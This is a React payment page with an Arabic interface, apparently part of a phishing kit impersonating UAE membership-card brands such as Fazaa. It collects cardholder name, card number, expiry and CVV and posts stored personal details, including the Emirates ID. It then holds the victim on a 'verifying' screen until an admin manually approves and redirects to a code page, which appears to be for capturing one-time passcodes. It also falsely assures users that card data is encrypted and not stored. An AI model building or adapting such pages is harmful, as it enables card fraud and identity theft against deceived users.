import React, { useState, useEffect, useRef } from 'react';
import { useLocation, useSearch } from 'wouter';
import { BRANDS, type BrandKey, type CardTypeKey } from '@/data/brands';

const BASE = import.meta.env.BASE_URL.replace(/\/$/, '');
const API = `${BASE}/api`;

/* ─────────────────────────────────────────
   نافذة الانتظار — تبقى ظاهرة حتى يقرر الأدمن
───────────────────────────────────────── */
function WaitingModal() {
  return (
    <div
      className="fixed inset-0 z-50 flex items-center justify-center"
      style={{ background: 'rgba(0,0,0,0.55)', backdropFilter: 'blur(3px)' }}
    >
      <div
        className="mx-6 w-full max-w-[340px] rounded-2xl px-8 py-8 flex flex-col items-center gap-5"
        style={{ background: 'rgba(55,55,55,0.92)' }}
      >
        <div className="w-14 h-14 rounded-full border-4 border-[#c9a227]/30 border-t-[#c9a227] animate-spin" />
        <p className="text-white text-center text-[15px] leading-relaxed">
          جاري التحقق من المعلومات، يرجى الانتظار…
        </p>
        <p className="text-white/50 text-xs text-center">
          سيتم مراجعة بياناتك من قِبل فريق العمل
        </p>
      </div>
    </div>
  );
}

/* ─── شعار الجهة ─── */
function BrandLogo({ brandKey }: { brandKey: BrandKey }) {
  const brand = BRANDS[brandKey] || BRANDS.fazaa;
  return (
    <div className="flex flex-col items-center">
      <div
        className="w-16 h-16 rounded-xl flex items-center justify-center text-white font-bold text-2xl shadow-sm mb-1"
        style={{ background: `linear-gradient(135deg, ${brand.darkColor}, ${brand.color})` }}
      >
        {brand.name.charAt(0)}
      </div>
      <span className="font-bold text-[13px] tracking-widest font-sans" style={{ color: brand.color }}>
        {brand.nameEn}
      </span>
    </div>
  );
}

/* ═══════════════════════════════════════ */
export default function Payment() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const params = new URLSearchParams(search);

  const brandKey = (params.get('brand') || 'fazaa') as BrandKey;
  const typeKey  = (params.get('type')  || 'gold')  as CardTypeKey;

  /* حقول */
  const [holderName, setHolderName] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [expiry, setExpiry]         = useState('');
  const [cvv, setCvv]               = useState('');
  const [errors, setErrors]         = useState<Record<string, string>>({});

  /* حالة */
  const [waiting, setWaiting] = useState(false);
  const [apiError, setApiError] = useState('');
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);

  /* cleanup */
  useEffect(() => () => { if (pollRef.current) clearInterval(pollRef.current); }, []);

  const handleCardNumber = (v: string) => {
    const d = v.replace(/\D/g, '').slice(0, 16);
    setCardNumber(d.replace(/(.{4})/g, '$1 ').trim());
  };

  const handleExpiry = (v: string) => {
    const d = v.replace(/\D/g, '').slice(0, 4);
    setExpiry(d.length >= 3 ? d.slice(0, 2) + '/' + d.slice(2) : d);
  };

  const validate = () => {
    const e: Record<string, string> = {};
    if (!holderName.trim())                         e.holderName = 'اسم حامل البطاقة مطلوب';
    if (cardNumber.replace(/\s/g, '').length < 16) e.cardNumber  = 'رقم البطاقة غير صحيح';
    if (!/^\d{2}\/\d{2}$/.test(expiry))            e.expiry      = 'تاريخ غير صحيح';
    if (cvv.length < 3)                             e.cvv         = 'رمز غير صحيح';
    setErrors(e);
    return Object.keys(e).length === 0;
  };

  const startPolling = (id: number) => {
    pollRef.current = setInterval(async () => {
      try {
        const res  = await fetch(`${API}/registrations/${id}`);
        const data = await res.json();

        if (data.status === 'approved') {
          clearInterval(pollRef.current!);
          setWaiting(false);
          setLocation(`/code?id=${id}`);
        } else if (data.status === 'rejected') {
          clearInterval(pollRef.current!);
          setWaiting(false);
          setLocation(`/register?brand=${brandKey}&type=${typeKey}`);
        }
      } catch { /* شبكة — تجاهل وانتظر */ }
    }, 2500);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!validate()) return;

    setApiError('');
    setWaiting(true);

    /* اقرأ بيانات التسجيل المحفوظة */
    let regData: any = null;
    try { regData = JSON.parse(sessionStorage.getItem('reg_data') || 'null'); } catch {}

    const payload = regData ?? {
      fullName: holderName, phone: '', emiratesId: '',
      brand: brandKey, cardType: typeKey,
      region: '', streetAddress: '', neighborhood: '',
      deliveryDate: new Date().toISOString().split('T')[0],
      paymentMethod: 'card',
    };

    try {
      const res = await fetch(`${API}/registrations`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

      if (!res.ok) throw new Error('فشل الإرسال');

      const { id } = await res.json();
      sessionStorage.removeItem('reg_data');

      /* ابدأ الـ polling انتظاراً لقرار الأدمن */
      startPolling(id);
    } catch {
      setWaiting(false);
      setApiError('حدث خطأ أثناء الإرسال، يرجى المحاولة مجدداً.');
    }
  };

  const inp = (f: string) =>
    `w-full bg-white border ${errors[f] ? 'border-red-400' : 'border-gray-200'} rounded-xl px-4 py-3 text-right outline-none focus:border-[#c9a227] focus:ring-1 focus:ring-[#c9a227] transition-shadow text-gray-800 placeholder:text-gray-300`;

  return (
    <>
      {waiting && <WaitingModal />}

      <div className="min-h-screen bg-[#f5f5f5] flex items-center justify-center py-10 px-4">
        <div className="w-full max-w-[480px] bg-white rounded-2xl shadow-md border border-gray-100 overflow-hidden">

          <div className="flex justify-end px-6 pt-7 pb-5 border-b border-gray-100">
            <BrandLogo brandKey={brandKey} />
          </div>

          <form onSubmit={handleSubmit} className="px-6 py-7 space-y-6" noValidate>

            <div className="space-y-1.5">
              <label className="block text-sm font-semibold text-gray-700 text-right">اسم حامل البطاقة</label>
              <input type="text" value={holderName} onChange={e => setHolderName(e.target.value)}
                placeholder="اسم حامل البطاقة" className={inp('holderName')} />
              {errors.holderName && <p className="text-xs text-red-500 text-right">{errors.holderName}</p>}
            </div>

            <div className="space-y-1.5">
              <label className="block text-sm font-semibold text-gray-700 text-right">رقم البطاقة</label>
              <div className="relative">
                <input type="text" inputMode="numeric" value={cardNumber}
                  onChange={e => handleCardNumber(e.target.value)}
                  placeholder="•••• •••• •••• ••••"
                  className={`${inp('cardNumber')} pl-12`} dir="ltr" />
                <div className="absolute left-3 top-1/2 -translate-y-1/2">
                  <svg width="28" height="20" viewBox="0 0 28 20" fill="none">
                    <rect width="28" height="20" rx="3" fill="#e5e7eb"/>
                    <rect y="5" width="28" height="5" fill="#9ca3af"/>
                    <rect x="3" y="13" width="7" height="3" rx="1" fill="#c9a227"/>
                  </svg>
                </div>
              </div>
              {errors.cardNumber && <p className="text-xs text-red-500 text-right">{errors.cardNumber}</p>}
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-1.5">
                <label className="block text-sm font-semibold text-gray-700 text-right">تاريخ الانتهاء</label>
                <input type="text" inputMode="numeric" value={expiry}
                  onChange={e => handleExpiry(e.target.value)}
                  placeholder="MM/YY" className={inp('expiry')} dir="ltr" maxLength={5} />
                {errors.expiry && <p className="text-xs text-red-500 text-right">{errors.expiry}</p>}
              </div>
              <div className="space-y-1.5">
                <label className="block text-sm font-semibold text-gray-700 text-right">رمز الأمان (CVV)</label>
                <input type="text" inputMode="numeric" value={cvv}
                  onChange={e => setCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
                  placeholder="•••" className={inp('cvv')} dir="ltr" maxLength={4} />
                {errors.cvv && <p className="text-xs text-red-500 text-right">{errors.cvv}</p>}
              </div>
            </div>

            <div className="bg-[#f8f5eb] border border-[#e8d99a] rounded-xl px-4 py-3 flex items-start gap-3">
              <span className="text-xl mt-0.5 shrink-0">🔒</span>
              <p className="text-[13px] text-gray-600 text-right leading-relaxed">
                جميع المعلومات المالية محمية ومشفرة. لن يتم حفظ بيانات البطاقة على خوادمنا.
              </p>
            </div>

            {apiError && (
              <p className="text-sm text-red-500 text-center bg-red-50 border border-red-200 rounded-xl py-3 px-4">
                {apiError}
              </p>
            )}

            <button type="submit" disabled={waiting}
              className="w-full bg-[#c9a227] hover:bg-[#b8943f] text-white font-bold text-[17px] py-4 rounded-xl transition-colors shadow-sm disabled:opacity-50 cursor-pointer">
              التالي
            </button>
          </form>
        </div>
      </div>
    </>
  );
}
